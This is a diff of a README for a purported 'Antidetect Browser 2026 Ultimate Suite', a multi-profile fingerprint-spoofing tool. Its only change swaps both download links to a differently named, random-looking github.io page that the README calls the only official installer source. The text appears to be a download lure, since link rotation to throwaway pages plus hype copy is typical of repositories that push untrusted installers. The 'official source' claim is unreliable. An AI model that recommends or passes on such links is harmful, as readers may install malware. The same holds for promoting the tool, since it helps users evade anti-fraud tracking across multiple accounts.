@@ -2,7 +2,7 @@
 
 Welcome to the **Antidetect Browser 2026 Ultimate Suite**, the definitive tool for managing multiple online identities on Windows 10 and 11. This package provides a comprehensive solution for creating, managing, and operating numerous isolated browser profiles, each with a unique digital fingerprint. Ideal for digital marketers, privacy-conscious users, and security researchers, it allows you to navigate the web without leaving a consistent, trackable signature.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -52,7 +52,7 @@ A: Absolutely. One of the core strengths of this complete multi-account tool is 
 
 Get the latest version of the Antidetect Browser 2026 Ultimate Suite. This is the only official source for the installer.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
